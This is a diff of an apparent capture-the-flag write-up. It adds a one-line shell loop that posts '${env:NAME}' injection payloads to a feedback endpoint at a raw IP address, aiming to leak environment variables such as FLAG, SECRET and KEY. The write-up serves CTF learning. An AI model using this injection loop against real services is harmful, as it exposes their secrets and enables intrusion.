@@ -53,7 +53,9 @@ So i made this simple for loop with some common names.
   do echo "Trying \${env:$i}"; <br>
   curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done </pre>
 
-  
 <img width="550" height="517" alt="image" src="https://github.com/user-attachments/assets/25021d73-134d-4c96-95f2-6ea222abfca7" />
 
 And there it is!, The flag!
+
+Here is the payload in 1 line if u want to copy paste it. 
+<pre>for i in   Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying \${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done</pre>
